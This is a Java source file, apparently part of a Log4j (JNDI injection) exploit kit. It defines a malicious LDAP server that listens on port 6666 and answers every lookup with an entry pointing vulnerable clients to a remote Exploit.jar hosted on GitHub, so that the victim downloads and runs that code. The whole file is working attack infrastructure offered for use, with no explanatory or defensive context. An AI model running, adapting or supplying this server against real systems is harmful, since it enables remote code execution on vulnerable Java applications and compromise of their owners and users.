package me.func.exploit;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.*;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.concurrent.locks.LockSupport;

public class LdapServer implements Server {

	@Override
	public void run() {
		try {
			InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");
			config.setListenerConfigs(new InMemoryListenerConfig(
					"listen",
					InetAddress.getByName("0.0.0.0"),
					6666,
					ServerSocketFactory.getDefault(),
					SocketFactory.getDefault(),
					(SSLSocketFactory) SSLSocketFactory.getDefault()
			));

			config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {

				@Override
				public void processSearchResult(InMemoryInterceptedSearchResult result) {

					String base = result.getRequest().getBaseDN();

					Entry entry = new Entry(base);
					entry.addAttribute("javaClassName", "Exploit");
					entry.addAttribute("javaSerializedData", "hz");
					entry.addAttribute("javaCodeBase", "https://raw.githubusercontent.com/oleksandrkyetov/log4j-boilerplate/master/Exploit.jar");

					try {
						result.sendSearchEntry(entry);
						result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
					} catch (LDAPException e) {
						throw new RuntimeException(e);
					}
				}
			});

			try (InMemoryDirectoryServer server = new InMemoryDirectoryServer(config)) {
				server.startListening();

				LockSupport.park();
			}
		} catch (LDAPException | UnknownHostException e) {
			throw new RuntimeException(e);
		}
	}
}
